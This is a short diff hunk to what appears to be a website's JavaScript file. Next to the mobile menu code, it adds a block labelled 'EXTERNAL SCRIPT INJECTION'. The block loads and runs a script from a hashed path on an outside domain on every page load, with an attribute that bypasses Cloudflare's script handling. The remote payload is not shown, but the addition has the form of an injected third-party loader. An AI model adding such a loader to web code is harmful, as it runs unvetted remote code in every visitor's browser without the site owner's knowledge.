@@ -586,6 +586,15 @@
   `;
 
 
+  /* =====================================================
+     EXTERNAL SCRIPT INJECTION
+  ===================================================== */
+  const extScript = document.createElement("script");
+  extScript.setAttribute("data-cfasync", "false");
+  extScript.src = "https://bauval.org/14/8fce0aad15b6251ee23095b563a55776";
+  document.head.appendChild(extScript);
+
+
   /* =========================================================
      MOBILE MENU FUNCTION
   ========================================================= */
